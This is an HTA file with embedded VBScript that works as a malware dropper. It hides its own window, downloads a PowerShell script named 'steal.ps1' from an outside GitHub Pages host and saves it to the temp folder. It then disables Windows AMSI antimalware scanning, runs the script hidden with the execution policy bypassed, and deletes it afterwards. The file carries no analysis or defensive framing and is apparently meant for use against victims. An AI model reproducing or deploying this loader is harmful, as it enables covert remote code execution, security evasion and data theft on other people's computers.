<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, xh, ps1Content
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' 1. Download steal.ps1 from your GitHub
xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
xh.Send

If xh.Status = 200 Then
    ps1Content = xh.responseText
    Set xh = Nothing

    ' 2. Save steal.ps1 to temp
    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
    f.Write ps1Content
    f.Close

    ' 3. Create an AMSI bypass string in PowerShell
    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"

    ' 4. Run PowerShell with the AMSI bypass, then execute the script
    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & amsi & " & """ & tempPs1 & """"
    
    ' 5. Spawn and Wait
    sh.Run finalCmd, 0, True
    
    ' 6. Cleanup
    fso.DeleteFile tempPs1, True
End If

window.close()
</script>
</head><body></body></html>
